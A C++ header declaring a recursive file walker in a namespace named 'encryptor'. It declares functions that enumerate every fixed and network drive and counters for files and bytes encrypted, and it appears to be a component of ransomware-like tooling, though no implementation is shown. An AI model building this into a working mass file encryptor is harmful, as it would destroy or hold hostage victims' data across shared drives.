// walker.h — Recursive filesystem enumeration
#pragma once

#include <windows.h>
#include <string>
#include <functional>
#include <atomic>

namespace encryptor {

struct WalkStats {
    std::atomic<uint64_t> files_seen{0};
    std::atomic<uint64_t> files_encrypted{0};
    std::atomic<uint64_t> files_skipped{0};
    std::atomic<uint64_t> bytes_encrypted{0};
    std::atomic<uint64_t> errors{0};
};

using FileCallback = std::function<bool(const std::wstring& path,
                                        const WIN32_FIND_DATAW& fd)>;

// Walk a directory tree. Calls callback for each file.
// Returns when complete or abort_flag is true.
void walk_directory(const std::wstring& root,
                    const FileCallback& cb,
                    std::atomic<bool>& abort_flag);

// Walk all fixed drives + network drives.
void walk_all_drives(const FileCallback& cb,
                     std::atomic<bool>& abort_flag);

} // namespace encryptor
